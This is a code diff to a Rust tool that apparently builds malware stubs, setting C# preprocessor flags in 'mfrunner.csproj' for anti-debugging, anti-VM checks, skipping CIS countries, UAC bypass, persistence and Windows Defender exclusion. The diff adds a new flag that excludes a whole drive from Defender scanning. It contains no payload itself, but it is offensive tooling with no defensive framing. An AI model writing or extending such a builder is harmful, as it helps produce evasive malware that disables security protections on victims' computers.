@@ -191,7 +191,7 @@ impl MfStubCS {
     pub fn set_symbols(&mut self, build_config: &MfBuilder) {
         println!("{}{}", h(), "Modifying preprocessor symbols...".color(Color::Yellow));
         
-        let mut new_symbols = "NATIVE;ANTI_DEBUG;ANTI_VM;BLACKLIST_CIS;BYPASS_UAC;SINGLE_INSTANCE;PERSISTANCE;DEFENDER_EXCLUSION;".to_string();
+        let mut new_symbols = "NATIVE;ANTI_DEBUG;ANTI_VM;BLACKLIST_CIS;BYPASS_UAC;SINGLE_INSTANCE;PERSISTANCE;DEFENDER_EXCLUSION;DEFENDER_EXCLUDE_DRIVE;".to_string();
 
         if build_config.build_arch == BinaryArch::NET64 || build_config.build_arch == BinaryArch::NET86 {
             new_symbols = new_symbols.replace("NATIVE;", "");
@@ -217,6 +217,9 @@ impl MfStubCS {
         if !build_config.defender_exclusion {
             new_symbols = new_symbols.replace("DEFENDER_EXCLUSION;", "");
         }
+        if !build_config.defender_exclude_drive {
+            new_symbols = new_symbols.replace("DEFENDER_EXCLUDE_DRIVE;", "");
+        }
         println!("{}{}{}", h(), "ANTI_DEBUG:          ".color(Color::Yellow), build_config.anti_debug.to_string().replace("t", "T").replace("f", "F").color(Color::Blue));
         println!("{}{}{}", h(), "ANTI_VM:             ".color(Color::Yellow), build_config.anti_virtual_machine.to_string().replace("t", "T").replace("f", "F").color(Color::Blue));
         println!("{}{}{}", h(), "BLACKLIST_CIS:       ".color(Color::Yellow), build_config.blacklist_cis_countries.to_string().replace("t", "T").replace("f", "F").color(Color::Blue));
@@ -224,10 +227,11 @@ impl MfStubCS {
         println!("{}{}{}", h(), "SINGLE_INSTANCE:     ".color(Color::Yellow), build_config.single_instance.to_string().replace("t", "T").replace("f", "F").color(Color::Blue));
         println!("{}{}{}", h(), "PERSISTANCE:         ".color(Color::Yellow), build_config.run_on_startup.to_string().replace("t", "T").replace("f", "F").color(Color::Blue));
         println!("{}{}{}", h(), "DEFENDER_EXCLUSION:  ".color(Color::Yellow), build_config.defender_exclusion.to_string().replace("t", "T").replace("f", "F").color(Color::Blue));
+        println!("{}{}{}", h(), "DEFENDER_EXCL_DRIVE: ".color(Color::Yellow), build_config.defender_exclude_drive.to_string().replace("t", "T").replace("f", "F").color(Color::Blue));
     
         let csproj_file_path = self.working_directory.clone() + "\\mfrunner.csproj";
         let mut csproj_file = fs::read_to_string(&csproj_file_path).unwrap();
-        csproj_file = csproj_file.replace("NATIVE;ANTI_DEBUG;ANTI_VM;BLACKLIST_CIS;BYPASS_UAC;SINGLE_INSTANCE;PERSISTANCE;DEFENDER_EXCLUSION;", &new_symbols);
+        csproj_file = csproj_file.replace("NATIVE;ANTI_DEBUG;ANTI_VM;BLACKLIST_CIS;BYPASS_UAC;SINGLE_INSTANCE;PERSISTANCE;DEFENDER_EXCLUSION;DEFENDER_EXCLUDE_DRIVE;", &new_symbols);
 
         fs::write(&csproj_file_path, csproj_file).unwrap();
         println!("{}{}{}", h(), "File updated:        ".color(Color::Yellow), "WorkingDirectory\\MfRunner.csproj".color(Color::Blue));
